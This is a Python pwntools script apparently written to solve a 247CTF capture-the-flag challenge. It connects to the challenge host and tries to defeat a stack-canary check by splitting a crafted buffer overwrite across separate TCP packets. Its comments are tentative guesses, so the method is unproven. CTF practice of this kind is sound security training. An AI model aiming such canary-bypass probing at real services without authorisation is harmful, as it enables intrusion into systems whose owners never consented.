#!/usr/bin/env python3
from pwn import *
import time

context.log_level = 'info'

# Key insight: read() on a socket returns when ANY data is available
# If we send data slowly, maybe read() returns early, preserving the canary

# Theory: If server's read() returns with only our first N bytes,
# the rest of buffer stays as initialized (canary at [32:48], zeros at [48:56])

# But we NEED [48:56] = "247CTF:)" which requires writing there

# New approach: What if we send data that makes read() return AFTER
# reading position 48 but with specific timing?

# Actually, let me reconsider the problem...
# The canary is copied to BOTH global and buffer[32:48]
# Then read() overwrites buffer from position 0

# If read() returns early (say after 48 bytes), buffer would be:
# [0:48] = our input
# [48:56] = zeros (from memset, untouched)
# check_canary fails because we overwrote [32:48]

# What if we send EXACTLY what the canary would be?
# We don't know the canary, but what if we can influence it?

# Wait - what about sending NO DATA at all in some iterations?
# Each iteration generates a NEW canary. What if we can skip iterations?

# Let's try: send EOF character or empty data
p = remote('cfea9b365e987c70.247ctf.com', 50068)
p.recvuntil(b'> ')

# Try sending just "247CTF:)" at position 48 by abusing TCP buffering
# Actually, let's try using TCP_NODELAY and careful timing

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
s.connect(('cfea9b365e987c70.247ctf.com', 50068))

# Receive banner
data = b''
while b'> ' not in data:
    data += s.recv(1024)
print(data.decode())

# Send 48 bytes first, then immediately "247CTF:)"
# The TCP_NODELAY should make them go in separate packets
first_part = b'A' * 32 + b'\x00' * 16  # 48 bytes total
second_part = b'247CTF:)'

s.send(first_part)
time.sleep(0.01)  # Tiny delay to potentially separate packets
s.send(second_part)

# Now receive response
time.sleep(0.5)
try:
    response = s.recv(4096)
    print("Response:", response.decode())
    if b'247CTF{' in response:
        print("FLAG FOUND!")
except Exception as e:
    print(f"Error: {e}")

s.close()
p.close()
